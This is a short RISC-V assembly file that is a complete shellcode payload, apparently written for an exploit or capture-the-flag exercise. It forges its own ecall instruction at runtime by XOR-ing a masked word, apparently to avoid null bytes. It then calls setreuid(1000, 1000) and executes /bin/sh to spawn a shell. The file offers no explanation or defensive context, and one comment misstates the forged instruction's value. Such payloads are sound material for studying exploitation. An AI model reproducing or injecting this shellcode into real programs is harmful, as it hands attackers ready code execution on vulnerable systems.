.section .text
.global _start

.equ UID, 1000

_start:
    c.j getaddr

    main:
        # forge ecall instruction (0x000000e3)
        # *ecall ^= 0xffffffff
        c.li s0, -1
        lw s1, -0xa(ra)
        xor s1, s0, s1
        sw s1, -0xa(ra)
        addi s2, ra, -0xa

        # setreuid(1000, 1000)
        li a0, UID
        li a1, UID

        li a7, 145 # SYS_setreuid

        jalr s2

        # execve("/bin//sh", NULL, NULL)
        li a2, 0
        li a1, 0
        sb a1, -1(s2)
        add a0, s2, -0x8

        li a7, 221
        jalr s2

    binsh:
        .ascii "/bin/sh"
        .byte 0xff
    ecall:
        .byte 0x8c, 0xff, 0xff, 0xff # ecall
        ret
    getaddr:
        call main

